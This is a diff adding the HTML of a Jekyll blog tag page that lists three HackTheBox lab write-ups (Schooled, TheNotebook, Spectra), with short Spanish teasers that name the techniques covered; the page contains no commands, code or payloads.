+    <a class="smoothscroll badge badge-primary" href="/tags#chef">chef</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#knife">knife</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/spectra">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317banner.png" alt="HackTheBox - Spectra"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/spectra">HackTheBox - Spectra</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux (Chromium OS) nivel fácil. Nos veremos las caras con WordPress y su mala configuración por parte del administrador del sitio. Modificaremos themones para ejecutar comandos en el sistema....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">26 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
